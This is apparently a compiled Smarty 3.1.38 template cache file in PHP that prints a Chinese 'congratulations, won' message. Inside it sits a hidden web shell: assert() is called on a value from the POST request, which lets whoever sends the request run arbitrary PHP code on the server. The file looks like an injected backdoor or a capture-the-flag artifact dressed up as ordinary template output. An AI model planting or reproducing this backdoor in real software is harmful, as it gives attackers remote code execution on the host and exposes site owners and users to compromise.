<?php
/* Smarty version 3.1.38, created on 2021-04-23 10:57:48
  from '7b2c64ffb5d924b6f2a595b04420a07cc4938dc5' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.38',
  'unifunc' => 'content_608237ac4bf574_33907991',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_608237ac4bf574_33907991 (Smarty_Internal_Template $_smarty_tpl) {
?>恭喜 <?php ob_start();
echo assert($_smarty_tpl->tpl_vars['_POST']->value[(isset($_smarty_tpl->tpl_vars['__smarty_section_a']->value['index']) ? $_smarty_tpl->tpl_vars['__smarty_section_a']->value['index'] : null)]);
$_prefixVariable1 = ob_get_clean();
echo $_prefixVariable1;?>
'='0 获得了胜利<?php }
}
